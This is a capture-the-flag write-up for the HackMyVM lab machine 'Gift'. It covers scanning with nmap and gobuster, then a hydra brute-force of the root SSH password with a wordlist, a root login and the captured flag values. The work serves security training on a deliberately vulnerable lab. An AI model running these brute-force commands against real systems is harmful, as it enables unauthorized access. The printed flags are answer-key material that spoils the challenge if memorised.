# Gift

## Executive Summary

| Item | Content |
| :--- | :--- |
| **Platform** | [HackMyVM](https://hackmyvm.eu/) |
| **Machine** | [Gift](https://hackmyvm.eu/machines/machine.php?vm=Gift) |
| **Author** | [sml](https://hackmyvm.eu/profile/?user=sml) |
| **Difficulty** | Beginner |

## PenetrationTest

### 1. Enumeration

#### 1-1. Host Scan

The target IP address is 192.168.56.103.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Gift]
└─$ fping -aqg 192.168.56.102/24
192.168.56.100
192.168.56.102
192.168.56.103
```

#### 1-2. Port Scan

The target open ports is 22 (ssh) and 80 (http).

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Gift]
└─$ nmap -A -sS -p- -v -T 4 --script=vuln 192.168.56.103 -oN nmap.log
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-20 23:10 -0400
NSE: Loaded 152 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 23:10
Completed NSE at 23:10, 10.01s elapsed
Initiating NSE at 23:10
Completed NSE at 23:10, 0.00s elapsed
Initiating ARP Ping Scan at 23:10
Scanning 192.168.56.103 [1 port]
Completed ARP Ping Scan at 23:10, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:10
Completed Parallel DNS resolution of 1 host. at 23:10, 0.50s elapsed
Initiating SYN Stealth Scan at 23:10
Scanning 192.168.56.103 [65535 ports]
Discovered open port 80/tcp on 192.168.56.103
Discovered open port 22/tcp on 192.168.56.103
Completed SYN Stealth Scan at 23:10, 30.64s elapsed (65535 total ports)
Initiating Service scan at 23:10
Scanning 2 services on 192.168.56.103
Completed Service scan at 23:10, 6.03s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.56.103
adjust_timeouts2: packet supposedly had rtt of -137563 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -137563 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -159125 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -159125 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -150511 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -150511 microseconds.  Ignoring time.
NSE: Script scanning 192.168.56.103.
Initiating NSE at 23:11
Completed NSE at 23:12, 68.27s elapsed
Initiating NSE at 23:12
Completed NSE at 23:12, 0.02s elapsed
Nmap scan report for 192.168.56.103
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.3: 
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       A2B36B85-C737-548F-8C04-9339EDCDBFF5    9.8     https://vulners.com/githubexploit/A2B36B85-C737-548F-8C04-9339EDCDBFF5  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
|       6192C35D-F78B-5C0A-AB8D-9826A79A5320    9.8     https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320  *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0  *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587  *EXPLOIT*
|       CVE-2026-35414  8.1     https://vulners.com/cve/CVE-2026-35414
|       CVE-2026-35386  8.1     https://vulners.com/cve/CVE-2026-35386
|       CVE-2026-35385  8.1     https://vulners.com/cve/CVE-2026-35385
|       BA3887BD-F579-53B1-A4A4-FF49E953E1C0    8.1     https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0  *EXPLOIT*
|       4FB01B00-F993-5CAF-BD57-D7E290D10C1F    8.1     https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F  *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    7.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       991D2CC4-0E09-5745-97A2-4917461BD6EC    7.8     https://vulners.com/githubexploit/991D2CC4-0E09-5745-97A2-4917461BD6EC  *EXPLOIT*
|       2E719186-2FED-58A8-A150-762EFBAAA523    7.8     https://vulners.com/gitee/2E719186-2FED-58A8-A150-762EFBAAA523  *EXPLOIT*
|       23CC97BE-7C95-513B-9E73-298C48D74432    7.8     https://vulners.com/githubexploit/23CC97BE-7C95-513B-9E73-298C48D74432  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    7.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       CVE-2021-28041  7.1     https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       284B94FC-FD5D-5C47-90EA-47900DAD1D1E    7.0     https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E  *EXPLOIT*
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254  *EXPLOIT*
|       85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0    6.8     https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       D104D2BF-ED22-588B-A9B2-3CCC562FE8C0    6.5     https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0  *EXPLOIT*
|       CVE-2026-35387  6.5     https://vulners.com/cve/CVE-2026-35387
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       C07ADB46-24B8-57B7-B375-9C761F4750A2    6.5     https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2  *EXPLOIT*
|       A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C    6.5     https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C  *EXPLOIT*
|       65B15AA1-2A8D-53C1-9499-69EBA3619F1C    6.5     https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C  *EXPLOIT*
|       5325A9D6-132B-590C-BDEF-0CB105252732    6.5     https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732  *EXPLOIT*
|       530326CF-6AB3-5643-AA16-73DC8CB44742    6.5     https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742  *EXPLOIT*
|       FD2E0EBA-ED84-5304-8862-84BCDEB2F288    5.9     https://vulners.com/githubexploit/FD2E0EBA-ED84-5304-8862-84BCDEB2F288  *EXPLOIT*
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CNVD-2021-25272 5.9     https://vulners.com/cnvd/CNVD-2021-25272
|       721F040C-37BC-59E1-9433-01A2EAC2E755    5.9     https://vulners.com/githubexploit/721F040C-37BC-59E1-9433-01A2EAC2E755  *EXPLOIT*
|       6D74A425-60A7-557A-B469-1DD96A2D8FF8    5.9     https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8  *EXPLOIT*
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       CVE-2025-61985  3.6     https://vulners.com/cve/CVE-2025-61985
|       CVE-2025-61984  3.6     https://vulners.com/cve/CVE-2025-61984
|       B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150    3.6     https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150  *EXPLOIT*
|       4C6E2182-0E99-5626-83F6-1646DD648C57    3.6     https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57  *EXPLOIT*
|       CVE-2026-35388  2.5     https://vulners.com/cve/CVE-2026-35388
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp open  http    nginx
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:F8:01:34 (Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Uptime guess: 13.750 days (since Thu May  7 05:11:25 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT      ADDRESS
1   16.40 ms 192.168.56.103

NSE: Script Post-scanning.
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.86 seconds
           Raw packets sent: 65639 (2.889MB) | Rcvd: 70849 (3.109MB)
```

#### 1-3. WebContentDiscovery

Found index.html.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Gift]
└─$ gobuster dir --url http://192.168.56.103 -w /usr/share/wordlists/dirb/common.txt -o gobuster.log 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 57]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

#### 1-4. index.html

The content is simple.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Gift]
└─$ curl http://192.168.56.103                                                        

Dont Overthink. Really, Its simple.
        <!-- Trust me -->
```

### 2. Exploitation

#### 2-1. Brute Force Attack

Root password is simple.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Gift]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.103 ssh | tee hydra.log
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-21 00:03:48
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.56.103:22/
[22][ssh] host: 192.168.56.103   misc: (null)   login: root   password: simple
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-21 00:04:16
```

#### 2-2. Access

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Gift]
└─$ ssh root@192.168.56.103
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@192.168.56.103's password: 
IM AN SSH SERVER
gift:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
gift:~# ls
root.txt  user.txt
gift:~# cat user.txt 
HMV665sXzDS
gift:~# cat root.txt 
HMVtyr543FG
gift:~# exit
Connection to 192.168.56.103 closed.
```

### 3. Conclusion & Loot

It was very easy.
I successfully captured flags.

- **User Flag:** HMV665sXzDS
- **Root Flag:** HMVtyr543FG

